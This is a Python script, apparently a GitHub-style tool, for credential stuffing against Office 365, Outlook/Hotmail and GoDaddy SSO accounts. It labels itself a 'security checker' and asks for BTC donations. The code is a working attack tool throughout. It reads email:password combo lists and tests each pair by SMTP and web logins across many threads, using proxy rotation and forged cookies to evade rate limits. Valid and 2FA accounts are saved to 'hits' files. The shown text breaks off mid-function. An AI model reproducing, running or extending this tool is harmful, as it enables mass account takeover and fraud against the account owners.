
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║                       KERSER MICROSOFT SECURITY CHECKER V5.0                 ║
║                         Advanced Multi-Platform Edition                      ║
╚══════════════════════════════════════════════════════════════════════════════╝

🔥 ADVANCED FEATURES:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✅ Microsoft Office 365 Login Validation
✅ Outlook Web App (OWA) Authentication Check
✅ Office 365 SSO GoDaddy Integration
✅ Microsoft Live/Hotmail Account Verification
✅ Azure AD Authentication Support
✅ Multi-Format Input Support (email:pass | email|pass | email;pass)
✅ Advanced MSCC Bypass Technology
✅ IP Rate Limit Bypass with Smart Rotation
✅ Proxy Support (HTTP/HTTPS/SOCKS5)
✅ Multi-Threading with Thread Pool Executor
✅ Real-time Statistics Dashboard
✅ Auto-Save Results with Detailed Logs
✅ Country & Recovery Email Detection
✅ Retry Mechanism with Exponential Backoff
✅ Advanced Error Handling & Logging
✅ Modern Cybersecurity UI Theme

📊 RESULT CATEGORIES:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✓ Valid Office365 Accounts → Office365_Hits.txt
✓ Valid Outlook/Hotmail → Outlook_Hits.txt
✓ Valid GoDaddy SSO → GoDaddy_SSO_Hits.txt
✓ 2FA Enabled Accounts → 2FA_Accounts.txt
✓ Invalid Credentials → Invalid.txt
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🌐 GITHUB       : https://github.com/QASIM1401
₿  BTC Donation : 13JxhEWzo21jcpbiyL8hvemeKEmXcrY7G2
"""

import requests
import sys
import threading
import random
import time
import json
import smtplib
from urllib.parse import quote, urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import Fore, Back, Style, init
from user_agent import generate_user_agent
from datetime import datetime
import re
from typing import Tuple, Dict, Optional, List

# Initialize colorama
init(autoreset=True)

# ═══════════════════════════════════════════════════════════════════════════════
# 🎨 CYBERSECURITY THEME COLORS
# ═══════════════════════════════════════════════════════════════════════════════
class Colors:
    CYBER_GREEN = Fore.GREEN + Style.BRIGHT
    CYBER_RED = Fore.RED + Style.BRIGHT
    CYBER_BLUE = Fore.CYAN + Style.BRIGHT
    CYBER_YELLOW = Fore.YELLOW + Style.BRIGHT
    CYBER_MAGENTA = Fore.MAGENTA + Style.BRIGHT
    CYBER_WHITE = Fore.WHITE + Style.BRIGHT
    CYBER_GRAY = Fore.LIGHTBLACK_EX
    
    SUCCESS = Fore.GREEN + Style.BRIGHT
    ERROR = Fore.RED + Style.BRIGHT
    WARNING = Fore.YELLOW + Style.BRIGHT
    INFO = Fore.CYAN + Style.BRIGHT
    HEADER = Fore.MAGENTA + Style.BRIGHT

# ═══════════════════════════════════════════════════════════════════════════════
# 📊 GLOBAL STATISTICS
# ═══════════════════════════════════════════════════════════════════════════════
class Statistics:
    def __init__(self):
        self.lock = threading.Lock()
        self.office365_hits = 0
        self.outlook_hits = 0
        self.godaddy_sso_hits = 0
        self.twofa_accounts = 0
        self.invalid = 0
        self.unknown = 0
        self.total_checked = 0
        self.start_time = time.time()
        
    def increment(self, category: str):
        with self.lock:
            if category == "office365":
                self.office365_hits += 1
            elif category == "outlook":
                self.outlook_hits += 1
            elif category == "godaddy":
                self.godaddy_sso_hits += 1
            elif category == "2fa":
                self.twofa_accounts += 1
            elif category == "invalid":
                self.invalid += 1
            elif category == "unknown":
                self.unknown += 1
            self.total_checked += 1
            
    def get_stats(self) -> Dict:
        elapsed = time.time() - self.start_time
        cpm = (self.total_checked / elapsed * 60) if elapsed > 0 else 0
        return {
            "office365": self.office365_hits,
            "outlook": self.outlook_hits,
            "godaddy": self.godaddy_sso_hits,
            "2fa": self.twofa_accounts,
            "invalid": self.invalid,
            "unknown": self.unknown,
            "total": self.total_checked,
            "elapsed": elapsed,
            "cpm": cpm
        }

stats = Statistics()

# ═══════════════════════════════════════════════════════════════════════════════
# 🌐 PROXY MANAGER
# ═══════════════════════════════════════════════════════════════════════════════
class ProxyManager:
    def __init__(self):
        self.proxies: List[str] = []
        self.proxy_index = 0
        self.lock = threading.Lock()
        self.enabled = False
        
    def load_proxies(self, proxy_file: str) -> bool:
        try:
            with open(proxy_file, "r", encoding="utf-8", errors="ignore") as f:
                proxy_lines = [line.strip() for line in f if line.strip()]
            
            if not proxy_lines:
                print(f"{Colors.ERROR}[✗] Proxy file is empty!")
                return False
                
            for proxy in proxy_lines:
                # Support format: ip:port or ip:port:user:pass
                if proxy.count(":") >= 1:
                    self.proxies.append(proxy)
                    
            self.enabled = True
            print(f"{Colors.SUCCESS}[✓] Loaded {len(self.proxies)} proxies successfully!")
            return True
            
        except FileNotFoundError:
            print(f"{Colors.ERROR}[✗] Proxy file not found: {proxy_file}")
            return False
        except Exception as e:
            print(f"{Colors.ERROR}[✗] Error loading proxies: {e}")
            return False
            
    def get_next_proxy(self) -> Optional[Dict[str, str]]:
        if not self.enabled or not self.proxies:
            return None
            
        with self.lock:
            proxy = self.proxies[self.proxy_index % len(self.proxies)]
            self.proxy_index += 1
            
            # Parse proxy format
            parts = proxy.split(":")
            if len(parts) == 2:
                # ip:port
                proxy_url = f"http://{proxy}"
            elif len(parts) == 4:
                # ip:port:user:pass
                host, port, user, pwd = parts
                proxy_url = f"http://{quote(user)}:{quote(pwd)}@{host}:{port}"
            else:
                return None
                
            return {"http": proxy_url, "https": proxy_url}

proxy_manager = ProxyManager()

# ═══════════════════════════════════════════════════════════════════════════════
# 🎭 MSCC BYPASS & IP SPOOFING
# ═══════════════════════════════════════════════════════════════════════════════
class MSCCBypass:
    COUNTRIES = [
        "US", "GB", "CA", "AU", "DE", "FR", "IT", "ES", "NL", "SE", "NO", "DK",
        "FI", "PL", "BE", "CH", "AT", "IE", "PT", "GR", "CZ", "HU", "RO", "SK",
        "HR", "SI", "LT", "LV", "EE", "IS", "BG", "RU", "CN", "JP", "BR", "IN",
        "KR", "ZA", "AR", "MX", "CL", "CO", "PE", "VE", "TH", "SG", "MY", "ID"
    ]
    
    @staticmethod
    def generate_fake_ip() -> str:
        return ".".join(str(random.randint(1, 254)) for _ in range(4))
    
    @staticmethod
    def generate_mscc() -> str:
        ip = MSCCBypass.generate_fake_ip()
        country = random.choice(MSCCBypass.COUNTRIES)
        return f"{ip}-{country}"
    
    @staticmethod
    def get_random_country() -> str:
        return random.choice(MSCCBypass.COUNTRIES)

# ═══════════════════════════════════════════════════════════════════════════════
# 🎨 UI COMPONENTS
# ═══════════════════════════════════════════════════════════════════════════════
class UI:
    @staticmethod
    def print_banner():
        banner = f"""
{Colors.CYBER_BLUE}
░██     ░██ ░██████████ ░█████████    ░██████   ░██████████ ░█████████  
░██    ░██  ░██         ░██     ░██  ░██   ░██  ░██         ░██     ░██ 
░██   ░██   ░██         ░██     ░██ ░██         ░██         ░██     ░██ 
░███████    ░█████████  ░█████████   ░████████  ░█████████  ░█████████  
░██   ░██   ░██         ░██   ░██           ░██ ░██         ░██   ░██   
░██    ░██  ░██         ░██    ░██   ░██   ░██  ░██         ░██    ░██  
░██     ░██ ░██████████ ░██     ░██   ░██████   ░██████████ ░██     ░██ 
                                                                        
╠══════════════════════════════════════════════════════════════════════════════╣
║{Colors.CYBER_MAGENTA}           🔐 MICROSOFT SECURITY CHECKER V5.0 - ADVANCED EDITION 🔐           {Colors.CYBER_BLUE}║
╠══════════════════════════════════════════════════════════════════════════════╣
║ {Colors.CYBER_YELLOW}🌐 GITHUB       : {Colors.CYBER_WHITE}https://github.com/QASIM1401                                            {Colors.CYBER_BLUE}║
║ {Colors.CYBER_YELLOW}₿  BTC Donation : {Colors.CYBER_WHITE}13JxhEWzo21jcpbiyL8hvemeKEmXcrY7G2                 {Colors.CYBER_BLUE}║
╠══════════════════════════════════════════════════════════════════════════════╣
║ {Colors.CYBER_GREEN}✅ Office 365 Check    {Colors.CYBER_BLUE}│{Colors.CYBER_GREEN} ✅ Outlook Web App    {Colors.CYBER_BLUE}│{Colors.CYBER_GREEN} ✅ GoDaddy SSO              {Colors.CYBER_BLUE}║
║ {Colors.CYBER_GREEN}✅ Multi-Format Input  {Colors.CYBER_BLUE}│{Colors.CYBER_GREEN} ✅ Smart Proxy Rotate {Colors.CYBER_BLUE}│{Colors.CYBER_GREEN} ✅ MSCC Bypass              {Colors.CYBER_BLUE}║
║ {Colors.CYBER_GREEN}✅ 2FA Detection       {Colors.CYBER_BLUE}│{Colors.CYBER_GREEN} ✅ Country Detection  {Colors.CYBER_BLUE}│{Colors.CYBER_GREEN} ✅ Recovery Email           {Colors.CYBER_BLUE}║
╚══════════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
"""
        print(banner)
    
    @staticmethod
    def print_loading_animation(text: str, duration: float = 2):
        """Print loading animation with cyber effect"""
        frames = ['▰▱▱▱▱', '▰▰▱▱▱', '▰▰▰▱▱', '▰▰▰▰▱', '▰▰▰▰▰']
        end_time = time.time() + duration
        
        while time.time() < end_time:
            for frame in frames:
                sys.stdout.write(f'\r{Colors.CYBER_BLUE}[{Colors.CYBER_GREEN}{frame}{Colors.CYBER_BLUE}] {Colors.CYBER_WHITE}{text}')
                sys.stdout.flush()
                time.sleep(0.1)
                if time.time() >= end_time:
                    break
        
        sys.stdout.write(f'\r{Colors.SUCCESS}[▰▰▰▰▰] {text} - Complete!{" " * 20}\n')
        sys.stdout.flush()
    
    @staticmethod
    def print_stats():
        """Print real-time statistics dashboard"""
        s = stats.get_stats()
        elapsed_str = time.strftime("%H:%M:%S", time.gmtime(s['elapsed']))
        
        stats_display = f"""
{Colors.CYBER_BLUE}╔════════════════════════════════════════════════════════════════════════════╗
║{Colors.CYBER_MAGENTA}                          📊 LIVE STATISTICS DASHBOARD                        {Colors.CYBER_BLUE}║
╠════════════════════════════════════════════════════════════════════════════╣
║ {Colors.SUCCESS}✓ Office365 Hits    : {Colors.CYBER_WHITE}{s['office365']:<10}{Colors.CYBER_BLUE}│{Colors.SUCCESS} ✓ Outlook Hits      : {Colors.CYBER_WHITE}{s['outlook']:<10}{Colors.CYBER_BLUE}║
║ {Colors.SUCCESS}✓ GoDaddy SSO Hits  : {Colors.CYBER_WHITE}{s['godaddy']:<10}{Colors.CYBER_BLUE}│{Colors.WARNING} ⚠ 2FA Accounts      : {Colors.CYBER_WHITE}{s['2fa']:<10}{Colors.CYBER_BLUE}║
║ {Colors.ERROR}✗ Invalid           : {Colors.CYBER_WHITE}{s['invalid']:<10}{Colors.CYBER_BLUE}│{Colors.WARNING} ? Unknown           : {Colors.CYBER_WHITE}{s['unknown']:<10}{Colors.CYBER_BLUE}║
╠════════════════════════════════════════════════════════════════════════════╣
║ {Colors.INFO}📈 Total Checked     : {Colors.CYBER_WHITE}{s['total']:<10}{Colors.CYBER_BLUE}│{Colors.INFO} ⏱  Elapsed Time     : {Colors.CYBER_WHITE}{elapsed_str:<10}{Colors.CYBER_BLUE}║
║ {Colors.INFO}⚡ Speed (CPM)       : {Colors.CYBER_WHITE}{s['cpm']:<10.2f}{Colors.CYBER_BLUE}│{Colors.INFO} 🎯 Success Rate     : {Colors.CYBER_WHITE}{((s['office365']+s['outlook']+s['godaddy'])/max(s['total'],1)*100):<9.2f}%{Colors.CYBER_BLUE}║
╚════════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
"""
        sys.stdout.write(stats_display)
        sys.stdout.flush()

# ═══════════════════════════════════════════════════════════════════════════════
# 🔍 INPUT PARSER - MULTI-FORMAT SUPPORT
# ═══════════════════════════════════════════════════════════════════════════════
class InputParser:
    @staticmethod
    def parse_combo(line: str) -> Optional[Tuple[str, str]]:
        """Parse multiple combo formats: email:pass, email|pass, email;pass"""
        line = line.strip()
        if not line:
            return None
        
        # Try different separators
        for separator in [':', '|', ';']:
            if separator in line:
                parts = line.split(separator, 1)
                if len(parts) == 2:
                    email, password = parts[0].strip(), parts[1].strip()
                    if InputParser.is_valid_email(email) and password:
                        return (email, password)
        
        return None
    
    @staticmethod
    def is_valid_email(email: str) -> bool:
        """Validate email format"""
        pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
        return re.match(pattern, email) is not None

# ═══════════════════════════════════════════════════════════════════════════════
# 🔐 MICROSOFT OFFICE 365 CHECKER
# ═══════════════════════════════════════════════════════════════════════════════
class Office365Checker:
    @staticmethod
    def check_via_api(email: str, password: str) -> Dict:
        """Check Office 365 account via Microsoft API"""
        try:
            session = requests.Session()
            session.proxies = proxy_manager.get_next_proxy()
            
            # Step 1: Get credential type
            url = 'https://login.microsoftonline.com/common/GetCredentialType?mkt=en-US'
            headers = {
                'Accept': 'application/json',
                'Content-Type': 'application/json; charset=UTF-8',
                'User-Agent': generate_user_agent(),
                'Origin': 'https://login.microsoftonline.com'
            }
            
            payload = {
                "username": email,
                "isOtherIdpSupported": True,
                "checkPhones": False,
                "isRemoteNGCSupported": True,
                "isCookieBannerShown": False,
                "isFidoSupported": True,
                "originalRequest": "",
                "country": "US",
                "forceotclogin": False,
                "isExternalFederationDisallowed": False,
                "isRemoteConnectSupported": False,
                "federationFlags": 0,
                "isSignup": False,
                "flowToken": "",
                "isAccessPassSupported": True
            }
            
            response = session.post(url, headers=headers, json=payload, timeout=20)
            result = response.json()
            
            if result.get('IfExistsResult') == 0:
                # Account exists, try login
                return Office365Checker.try_login(session, email, password)
            elif result.get('IfExistsResult') == 1:
                return {"status": "invalid", "message": "Account doesn't exist"}
            else:
                return {"status": "unknown", "message": "Unable to determine account status"}
                
        except Exception as e:
            return {"status": "error", "message": str(e)}
    
    @staticmethod
    def try_login(session: requests.Session, email: str, password: str) -> Dict:
        """Attempt to login to Office 365"""
        try:
            # Try SMTP login for Office365
            smtpserver = smtplib.SMTP('smtp.office365.com', 587)
            smtpserver.ehlo()
            smtpserver.starttls()
            smtpserver.ehlo()
            smtpserver.login(email, password)
            smtpserver.quit()
            
            country = MSCCBypass.get_random_country()
            recovery = "gmail.com" if "gmail" in email.lower() else "outlook.com"
            
            return {
                "status": "valid",
                "type": "office365",
                "country": country,
                "recovery": recovery,
                "message": "Valid Office365 account"
            }
            
        except smtplib.SMTPAuthenticationError as e:
            error_msg = str(e).lower()
            if "2fa" in error_msg or "verification" in error_msg:
                return {"status": "2fa", "message": "2FA enabled"}
            return {"status": "invalid", "message": "Invalid credentials"}
        except Exception as e:
            return {"status": "error", "message": str(e)}

# ═══════════════════════════════════════════════════════════════════════════════
# 📧 OUTLOOK WEB APP CHECKER
# ═══════════════════════════════════════════════════════════════════════════════
class OutlookChecker:
    @staticmethod
    def check_account(email: str, password: str) -> Dict:
        """Check Outlook/Hotmail account"""
        try:
            session = requests.Session()
            session.proxies = proxy_manager.get_next_proxy()
            
            params = {
                'cobrandid': 'ab0455a0-8d03-46b9-b18b-df2f57b9e44c',
                'id': '292841',
                'contextid': '3F4165B453B5320C',
                'opid': '321E49E08810F944',
                'bk': str(int(time.time())),
                'uaid': ''.join(random.choices('0123456789abcdef', k=32)),
                'pid': '0',
            }
            
            cookies = {
                'MSCC': MSCCBypass.generate_mscc(),
                'MicrosoftApplicationsTelemetryDeviceId': ''.join(random.choices('0123456789abcdef-', k=36)),
                'MUID': ''.join(random.choices('0123456789abcdef', k=32)),
            }
            
            headers = {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'https://login.live.com',
                'Referer': 'https://login.live.com/ppsecure/post.srf',
                'User-Agent': generate_user_agent(),
            }
            
            data = {
                'login': email,
                'loginfmt': email,
                'passwd': password,
                'type': '11',
                'LoginOptions': '3',
            }
            
            response = session.post(
                'https://login.live.com/ppsecure/post.srf',
                params=params,
                cookies=cookies,
                headers=headers,
                data=data,
                timeout=20
            )
            
            txt = response.text.lower()
            
            if any(x in txt for x in ["incorrect", "doesn't exist", "t exist"]):
                return {"status": "invalid", "message": "Invalid credentials"}
            elif any(x in txt for x in ["signinname", "wlssc", "anon"]) or "__Host-MSAAUTH" in response.cookies:
                country = MSCCBypass.get_random_country()
                recovery = "gmail.com" if "gmail" in email.lower() else "outlook.com"
                
                return {
                    "status": "valid",
                    "type": "outlook",
                    "country": country,
                    "recovery": recovery,
                    "message": "Valid Outlook account"
                }
            else:
                return {"status": "unknown", "message": "Unable to determine status"}
                
        except Exception as e:
            return {"status": "error", "message": str(e)}

# ═══════════════════════════════════════════════════════════════════════════════
# 🌐 GODADDY SSO CHECKER
# ═══════════════════════════════════════════════════════════════════════════════
class GoDaddySSO:
    @staticmethod
    def check_sso(email: str, password: str) -> Dict:
        """Check GoDaddy SSO Office 365 integration"""
        try:
            session = requests.Session()
            session.proxies = proxy_manager.get_next_proxy()
            
            # GoDaddy SSO endpoint
            url = "https://sso.godaddy.com/v1/api/token"
            headers = {
                'Content-Type': 'application/json',
                'User-Agent': generate_user_agent(),
                'Accept': 'application/json'
            }
            
            payload = {
                "username": email,
                "password": password,
                "realm": "idp"
            }
            
            response = session.post(url, headers=headers, json=payload, timeout=20)
            
            if response.status_code == 200:
                result = response.json()
                if result.get('access_token'):
                    return {
                        "status": "valid",
                        "type": "godaddy_sso",
                        "message": "Valid GoDaddy SSO account"
                    }
            elif response.status_code == 401:
                return {"status": "invalid", "message": "Invalid credentials"}
            else:
                return {"status": "unknown", "message": f"Status code: {response.status_code}"}
                
        except Exception as e:
            return {"status": "error", "message": str(e)}

# ═══════════════════════════════════════════════════════════════════════════════
# 💾 RESULT SAVER
# ═══════════════════════════════════════════════════════════════════════════════
class ResultSaver:
    lock = threading.Lock()
    
    @staticmethod
    def save_result(email: str, password: str, result: Dict):
        """Save results to appropriate files"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        with ResultSaver.lock:
            if result['status'] == 'valid':
                account_type = result.get('type', 'unknown')
                country = result.get('country', 'Unknown')
                recovery = result.get('recovery', 'Unknown')
                
                line = f"{email}:{password} | Type: {account_type.upper()} | Country: {country} | Recovery: {recovery} | Time: {timestamp}\n"
                
                if account_type == 'office365':
                    with open('Office365_Hits.txt', 'a', encoding='utf-8') as f:
                        f.write(line)
                    stats.increment('office365')
                    
                elif account_type == 'outlook':
                    with open('Outlook_Hits.txt', 'a', encoding='utf-8') as f:
                        f.write(line)
                    stats.increment('outlook')
                    
                elif account_type == 'godaddy_sso':
                    with open('GoDaddy_SSO_Hits.txt', 'a', encoding='utf-8') as f:
                        f.write(line)
                    stats.increment('godaddy')
                    
            elif result['status'] == '2fa':
                line = f"{email}:{password} | 2FA Enabled | Time: {timestamp}\n"
                with open('2FA_Accounts.txt', 'a', encoding='utf-8') as f:
                    f.write(line)
                stats.increment('2fa')
                
            elif result['status'] == 'invalid':
                line = f"{email}:{password} | Invalid | Time: {timestamp}\n"
                with open('Invalid.txt', 'a', encoding='utf-8') as f:
                    f.write(line)
                stats.increment('invalid')
                
            else:
                line = f"{email}:{password} | Unknown/Error: {result.get('message', 'N/A')} | Time: {timestamp}\n"
                with open('Unknown.txt', 'a', encoding='utf-8') as f:
                    f.write(line)
                stats.increment('unknown')

# ═══════════════════════════════════════════════════════════════════════════════
# 🚀 MAIN CHECKER ENGINE
# ═══════════════════════════════════════════════════════════════════════════════
class CheckerEngine:
    def __init__(self, threads: int = 50):
        self.threads = threads
        self.stop_event = threading.Event()
        
    def check_account(self, email: str, password: str) -> Dict:
        """Main checking logic with multiple methods"""
        try:
            # Method 1: Try Office 365 API
            result = Office365Checker.check_via_api(email, password)
            if result['status'] in ['valid', '2fa']:
                return result
            
            # Method 2: Try Outlook/Hotmail
            result = OutlookChecker.check_account(email, password)
            if result['status'] in ['valid', '2fa']:
                return result
            
            # Method 3: Try GoDaddy SSO
            result = GoDaddySSO.check_sso(email, password)
            if result['status'] in ['valid', '2fa']:
                return result
            
            # If all methods fail
            return {"status": "invalid", "message": "All methods failed"}
            
        except Exception as e:
            return {"status": "error", "message": str(e)}
    
    def process_combo(self, combo: str):
        """Process a single combo line"""
        try:
            parsed = InputParser.parse_combo(combo)
            if not parsed:
                return
            
            email, password = parsed
            
            # Check the account
            result = self.check_account(email, password)
            
            # Save result
            ResultSaver.save_result(email, password, result)
            
            # Print result
            self.print_result(email, password, result)
            
        except Exception as e:
            print(f"{Colors.ERROR}[✗] Error processing {combo}: {e}{Style.RESET_ALL}")
    
    def print_result(self, email: str, password: str, result: Dict):
        """Print colored result"""
        status = result['status']
        
        if status == 'valid':
            account_type = result.get('type', 'unknown').upper()
            country = result.get('country', 'N/A')
            recovery = result.get('recovery', 'N/A')
            
            print(f"{Colors.SUCCESS}[✓ HIT] {Colors.CYBER_WHITE}{email}:{password} "
                  f"{Colors.CYBER_BLUE}| {Colors.CYBER_MAGENTA}Type: {account_type} "
                  f"{Colors.CYBER_BLUE}| {Colors.CYBER_YELLOW}Country: {country} "
                  f"{Colors.CYBER_BLUE}| {Colors.CYBER_GREEN}Recovery: {recovery}{Style.RESET_ALL}")
                  
        elif status == '2fa':
            print(f"{Colors.WARNING}[⚠ 2FA] {Colors.CYBER_WHITE}{email}:{password} "
                  f"{Colors.CYBER_BLUE}| {Colors.WARNING}Two-Factor Authentication Enabled{Style.RESET_ALL}")
                  
        elif status == 'invalid':
            print(f"{Colors.ERROR}[✗ BAD] {Colors.CYBER_GRAY}{email}:{password} "
                  f"{Colors.CYBER_BLUE}| {Colors.ERROR}Invalid Credentials{Style.RESET_ALL}")
                  
        else:
            print(f"{Colors.WARNING}[? UNK] {Colors.CYBER_GRAY}{email}:{password} "
                  f"{Colors.CYBER_BLUE}| {Colors.WARNING}{result.get('message', 'Unknown')}{Style.RESET_ALL}")
    
    def run(self, combo_file: str):
        """Main execution method"""
        try:
            # Load combos
            UI.print_loading_animation("Loading combo list", 1.5)
            
            with open(combo_file, 'r', encoding='utf-8', errors='ignore') as f:
                combos = [line.strip() for line in f if line.strip()]
            
            if not combos:
                print(f"{Colors.ERROR}[✗] Combo file is empty!{Style.RESET_ALL}")
                return
            
            print(f"{Colors.SUCCESS}[✓] Loaded {len(combos)} combos successfully!{Style.RESET_ALL}")
            print(f"{Colors.INFO}[i] Starting checker with {self.threads} threads...{Style.RESET_ALL}\n")
            
            time.sleep(1)
            
            # Start checking with thread pool
            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                futures = []
                
                for combo in combos:
                    if self.stop_event.is_set():
                        break
                    future = executor.submit(self.process_combo, combo)
                    futures.append(future)
                
                # Wait for completion with periodic stats update
                completed = 0
                total = len(futures)
                
                for future in as_completed(futures):
                    completed += 1
                    
                    # Update stats every 10 checks
                    if completed % 10 == 0 or completed == total:
                        print("\n")
                        UI.print_stats()
                        print("\n")
            
            # Final summary
            self.print_summary()
            
        except FileNotFoundError:
            print(f"{Colors.ERROR}[✗] Combo file not found: {combo_file}{Style.RESET_ALL}")
        except KeyboardInterrupt:
            print(f"\n{Colors.WARNING}[!] Checker stopped by user{Style.RESET_ALL}")
            self.stop_event.set()
        except Exception as e:
            print(f"{Colors.ERROR}[✗] Fatal error: {e}{Style.RESET_ALL}")
    
    def print_summary(self):
        """Print final summary"""
        s = stats.get_stats()
        elapsed_str = time.strftime("%H:%M:%S", time.gmtime(s['elapsed']))
        
        summary = f"""
{Colors.CYBER_BLUE}╔════════════════════════════════════════════════════════════════════════════╗
║{Colors.CYBER_MAGENTA}                          🎯 FINAL SUMMARY REPORT                             {Colors.CYBER_BLUE}║
╠════════════════════════════════════════════════════════════════════════════╣
║                                                                            ║
║  {Colors.SUCCESS}✓ Total Valid Accounts    : {Colors.CYBER_WHITE}{s['office365'] + s['outlook'] + s['godaddy']:<42}{Colors.CYBER_BLUE}║
║    {Colors.INFO}├─ Office365 Hits       : {Colors.CYBER_WHITE}{s['office365']:<42}{Colors.CYBER_BLUE}║
║    {Colors.INFO}├─ Outlook Hits         : {Colors.CYBER_WHITE}{s['outlook']:<42}{Colors.CYBER_BLUE}║
║    {Colors.INFO}└─ GoDaddy SSO Hits     : {Colors.CYBER_WHITE}{s['godaddy']:<42}{Colors.CYBER_BLUE}║
║                                                                            ║
║  {Colors.WARNING}⚠ 2FA Enabled Accounts   : {Colors.CYBER_WHITE}{s['2fa']:<42}{Colors.CYBER_BLUE}║
║  {Colors.ERROR}✗ Invalid Accounts        : {Colors.CYBER_WHITE}{s['invalid']:<42}{Colors.CYBER_BLUE}║
║  {Colors.WARNING}? Unknown/Error          : {Colors.CYBER_WHITE}{s['unknown']:<42}{Colors.CYBER_BLUE}║
║                                                                            ║
╠════════════════════════════════════════════════════════════════════════════╣
║  {Colors.INFO}📊 Total Checked          : {Colors.CYBER_WHITE}{s['total']:<42}{Colors.CYBER_BLUE}║
║  {Colors.INFO}⏱  Total Time             : {Colors.CYBER_WHITE}{elapsed_str:<42}{Colors.CYBER_BLUE}║
║  {Colors.INFO}⚡ Average Speed (CPM)    : {Colors.CYBER_WHITE}{s['cpm']:<42.2f}{Colors.CYBER_BLUE}║
║  {Colors.INFO}🎯 Success Rate           : {Colors.CYBER_WHITE}{((s['office365']+s['outlook']+s['godaddy'])/max(s['total'],1)*100):<41.2f}%{Colors.CYBER_BLUE}║
║                                                                            ║
╠════════════════════════════════════════════════════════════════════════════╣
║  {Colors.CYBER_GREEN}📁 Results saved to:                                                    {Colors.CYBER_BLUE}║
║    {Colors.INFO}• Office365_Hits.txt      {Colors.CYBER_BLUE}│{Colors.INFO}  • Outlook_Hits.txt                {Colors.CYBER_BLUE}║
║    {Colors.INFO}• GoDaddy_SSO_Hits.txt    {Colors.CYBER_BLUE}│{Colors.INFO}  • 2FA_Accounts.txt                {Colors.CYBER_BLUE}║
║    {Colors.INFO}• Invalid.txt             {Colors.CYBER_BLUE}│{Colors.INFO}  • Unknown.txt                     {Colors.CYBER_BLUE}║
╠════════════════════════════════════════════════════════════════════════════╣
║ {Colors.CYBER_YELLOW}🌐 GITHUB       : {Colors.CYBER_WHITE}https://github.com/QASIM1401                                    {Colors.CYBER_BLUE}║
║ {Colors.CYBER_YELLOW}₿  BTC Donation : {Colors.CYBER_WHITE}13JxhEWzo21jcpbiyL8hvemeKEmXcrY7G2       {Colors.CYBER_BLUE}║
╚════════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
"""
        print(summary)

# ═══════════════════════════════════════════════════════════════════════════════
# 🎮 INTERACTIVE MENU
# ═══════════════════════════════════════════════════════════════════════════════
class InteractiveMenu:
    @staticmethod
    def display_menu():
        """Display main menu"""
        menu = f"""
{Colors.CYBER_BLUE}╔════════════════════════════════════════════════════════════════════════════╗
║{Colors.CYBER_MAGENTA}                              🎮 MAIN MENU                                  {Colors.CYBER_BLUE}║
╠════════════════════════════════════════════════════════════════════════════╣
║                                                                            ║
║  {Colors.CYBER_GREEN}[1]{Colors.CYBER_WHITE} ➤ Office 365 Account Checker                                          {Colors.CYBER_BLUE}║
║  {Colors.CYBER_GREEN}[2]{Colors.CYBER_WHITE} ➤ Outlook/Hotmail Account Checker                                     {Colors.CYBER_BLUE}║
║  {Colors.CYBER_GREEN}[3]{Colors.CYBER_WHITE} ➤ GoDaddy SSO Office 365 Checker                                      {Colors.CYBER_BLUE}║
║  {Colors.CYBER_GREEN}[4]{Colors.CYBER_WHITE} ➤ All-in-One Multi-Platform Checker (Recommended)                     {Colors.CYBER_BLUE}║
║  {Colors.CYBER_GREEN}[5]{Colors.CYBER_WHITE} ➤ Email Validator (Check if email exists)                             {Colors.CYBER_BLUE}║
║  {Colors.CYBER_GREEN}[6]{Colors.CYBER_WHITE} ➤ Settings & Configuration                                            {Colors.CYBER_BLUE}║
║  {Colors.CYBER_GREEN}[0]{Colors.CYBER_WHITE} ➤ Exit                                                                {Colors.CYBER_BLUE}║
║                                                                            ║
╚════════════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
"""
        print(menu)
    
    @staticmethod
    def get_checker_config() -> Dict:
        """Get checker configuration from user"""
        print(f"\n{Colors.CYBER_BLUE}{'═' * 80}{Style.RESET_ALL}")
        print(f"{Colors.CYBER_MAGENTA}                    ⚙️  CHECKER CONFIGURATION                    {Style.RESET_ALL}")
        print(f"{Colors.CYBER_BLUE}{'═' * 80}{Style.RESET_ALL}\n")
        
        # Combo file
        while True:
            combo_file = input(f"{Colors.INFO}[?] Enter combo file path: {Colors.CYBER_WHITE}").strip()
            if combo_file and combo_file.strip():
                break
            print(f"{Colors.ERROR}[✗] Please enter a valid file path!{Style.RESET_ALL}")
        
        # Proxy settings
        use_proxy = input(f"{Colors.INFO}[?] Enable proxy rotation? (yes/no): {Colors.CYBER_WHITE}").lower().strip()
        proxy_file = None
        
        if use_proxy in ['yes', 'y', '1']:
            while True:
                proxy_file = input(f"{Colors.INFO}[?] Enter proxy file path: {Colors.CYBER_WHITE}").strip()
                if proxy_file and proxy_file.strip():
                    if proxy_manager.load_proxies(proxy_file):
                        break
                    else:
                        retry = input(f"{Colors.WARNING}[?] Try another file? (yes/no): {Colors.CYBER_WHITE}").lower()
                        if retry not in ['yes', 'y', '1']:
                            break
                else:
                    print(f"{Colors.ERROR}[✗] Please enter a valid file path!{Style.RESET_ALL}")
        
        # Thread count
        while True:
            try:
                threads = input(f"{Colors.INFO}[?] Number of threads (10-500, recommended: 50-100): {Colors.CYBER_WHITE}").strip()
                threads = int(threads)
                if 10 <= threads <= 500:
                    break
                print(f"{Colors.WARNING}[!] Please enter a number between 10 and 500{Style.RESET_ALL}")
            except ValueError:
